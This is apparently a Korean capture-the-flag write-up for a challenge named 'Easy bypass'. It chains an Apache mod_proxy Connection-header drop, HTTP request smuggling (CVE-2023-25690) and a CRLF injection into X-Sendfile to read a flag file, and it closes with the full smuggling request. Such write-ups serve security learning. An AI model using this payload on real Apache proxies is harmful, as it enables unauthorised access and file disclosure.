## Easy bypass

#### 존재 취약점 
---
- apache modproxy의 Connection 헤더를 사용한 강제 헤더 드랍
- CVE-2023-25690(HRS)을 사용한 /admin 접근
- /admin/status의 CRLF 인젝션 취약점
- X-Sendfile의 내부 flag 파일 서빙


#### Flow
---
1. holyshield-vhost.conf 파일에서 /login 외 admin이 아닌 모든 요청에 대해 X-Access-Denied: banned 헤더를 추가해서 보내며 backend에서 이 헤더가 담긴 요청을 Drop한다. 

apache mod-proxy에서 Connection: X-Access-Denied 헤더를 추가하면 해당 헤더를 백엔드 전송 전 Drop해 로직을 우회할 수 있다.  또한 이후 이어질 HRS flow를 위해 Keep-alive를 추가해 요청이 끝나지 않았음을 알린다.

2. /admin 경로에 대한 접근제한은 프록시에서만 수행한다. 따라서 apache mod-proxy 2.4.55
버전에 존재하는 HRS 취약점(CVE-2023-25690)을 통해 프록시를 거치지 않고 백엔드에 접근 가능하다.

3. /admin/status에서 유저에게 입력받은 cache 파라미터를 전달할 응답 헤더에 삽입하고 있다. 이는 CRLF injection 취약점을 야기하며, %0D%0AX-Sendfile:%20/var/secret/flag 와 같은 값 삽입 시 apache mod-proxy는 flag파일을 서빙한다.

4. 이후 요청을 보내면 HRS가 트리거되어 flag를 확인 가능하다.


#### Payload
---
```
BurpSuite

GET /proxy/%20HTTP/1.1%0d%0aHost:%20localhost:10001%0d%0a%0d%0aGET%20/admin/status%3Fcache=test%250D%250AX-Sendfile:%2520/var/secret/flag%250d%250aHost:%2520backend:8088%250d%250a%250d%250a HTTP/1.1
Host: localhost:8888
Connection: X-Access-Denied,keep-alive

GET / HTTP/1.1
Host: localhost
Connection: close


** Update Content-Length 옵션 필히 끌것.
```
